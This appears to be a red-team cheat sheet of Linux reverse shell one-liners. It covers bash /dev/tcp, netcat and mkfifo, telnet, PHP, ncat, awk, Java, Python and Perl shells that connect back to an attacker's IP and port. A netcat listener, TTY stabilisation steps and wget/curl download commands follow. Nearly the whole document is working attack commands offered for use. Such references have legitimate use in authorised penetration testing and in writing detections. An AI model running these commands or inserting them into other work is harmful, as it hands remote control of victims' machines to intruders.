LINUX REVERSE SHELLS

The following are ways to get reverse shells back to your red team device. All IP and PORT should be changed to your listening box

PWNCAT

Amazing raw bind and reverse shell handler!

You can find it on their Github - CLICK HERE

Bash

bash -i >& /dev/tcp/IP/PORT 0>&1

or

nohup bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'

NC

nc -e /bin/sh IP PORT

or

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP PORT >/tmp/f

NC listener

nc -v -n -l -p PORT

Telnet

telnet IP PORT | /bin/bash | telnet IP PORT

PHP

php -r '$sock=fsockopen("IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'

Ncat

ncat --exec cmd.exe --allow IP -vnl 5555 --ssl

On red team box do: ncat -v targetIP 5555 --ssl

Awk

awk 'BEGIN {s = "/inet/tcp/0/IP/PORT"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null

Java

r = Runtime.getRuntime()

p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/IP/PORT;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])

p.waitFor()

Python

python -c 'import

socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

Perl

perl -e 'use

Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

Stabilize your shell

On target box:

python -c "import pty; pty.spawn('/bin/bash')"

CTRL + Z

On your box:

stty raw -echo

fg

On target box:

export TERM=xterm

Quick web HTTP share of current directory

python -m SimpleHTTPServer 80

or

python3 -m http.server 8080

Use wget to download a file

wget https://address/file

Use curl to download a file

curl https://address/file.sh --output file.sh
